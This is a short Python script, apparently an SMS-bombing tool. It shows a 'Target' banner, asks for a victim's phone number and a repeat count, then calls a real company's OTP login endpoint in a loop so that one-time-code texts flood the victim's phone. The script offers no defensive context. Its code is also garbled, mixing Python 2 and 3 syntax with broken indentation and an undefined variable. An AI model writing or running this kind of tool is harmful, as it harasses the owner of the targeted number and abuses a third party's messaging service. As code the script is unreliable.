import requests
print"\033[1;97m  ______                      __" 

	print(" /_  __/___ __________ ____  / /_\033[1;92m   " +durasi)	print"\033[1;97m  / / / __ `/ ___/ __ `/ _ \/ __/"

	print" / / / /_/ / /  / /_/ /  __/ /_"

	print"/_/  \__,_/_/   \__, /\___/\__/"

	print"               /____/"

number = int (input("Enter Your Number :"))

thre = int (input( " Enter Your TRe Number : "))

for i in range (thre) :

    response = requests.post( "https://api2.bongobd.com/api/login/send-otp",data={"operator":"all","msisdn":number})

    if response.status_code == 200 :
        print ("sms sent")

    else :
        print ("failed")
